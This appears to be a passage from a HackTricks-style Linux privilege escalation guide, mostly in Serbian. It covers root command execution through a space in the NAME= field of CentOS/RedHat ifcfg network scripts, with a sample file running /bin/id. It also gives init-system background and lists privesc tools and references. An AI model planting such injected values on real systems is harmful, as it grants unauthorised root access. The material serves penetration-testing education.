### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **zapiše** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može da **izmeni** postojeću, onda je vaš **system is pwned**.

Network skripte, npr. _ifcfg-eth0_, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su \~sourced\~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim mrežnim skriptama se ne obrađuje ispravno. Ako u imenu imate **prazan razmak, sistem pokušava da izvrši deo posle praznog razmaka**. To znači da se **sve što je posle prvog razmaka izvršava kao root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: prazno mesto između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servise. One se mogu izvršavati direktno ili kroz simboličke linkove koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart**, novijim sistemom za upravljanje servisima koji je uveo Ubuntu, i koristi konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog kompatibilnosti ugrađene u Upstart.

**systemd** se pojavljuje kao moderan init i menadžer servisa, nudeći napredne funkcije kao što su pokretanje daemona na zahtev, upravljanje automount-ovima i snapshot-ovi stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, pojednostavljujući proces administracije sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall da bi izložili privilegovanu kernel funkcionalnost userspace manageru. Slaba autentifikacija managera (npr. provere potpisa zasnovane na FD-order ili loše password sheme) može omogućiti lokalnoj aplikaciji da se prerušava u managera i eskalira do root na uređajima koji su već root-ovani. Saznajte više i detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
